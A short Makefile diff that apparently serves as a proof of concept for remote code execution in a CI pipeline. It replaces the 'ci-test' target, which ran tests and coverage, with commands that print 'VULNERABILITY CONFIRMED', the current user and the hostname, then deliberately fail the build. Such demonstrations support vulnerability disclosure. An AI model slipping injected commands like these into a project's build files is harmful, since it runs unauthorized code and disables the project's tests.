@@ -31,7 +31,11 @@ help: ## Display help
 
 presubmit: verify test ## Run all steps in the developer loop
 
-ci-test: test coverage ## Runs tests and submits coverage
+ci-test:
+	@echo "VULNERABILITY CONFIRMED: Linode Provider RCE"
+	@echo "User: $$(whoami)"
+	@echo "Hostname: $$(hostname)"
+	@exit 1 # Fail the build to highlight logs
 
 ci-non-test: verify vulncheck ## Runs checks other than tests
 
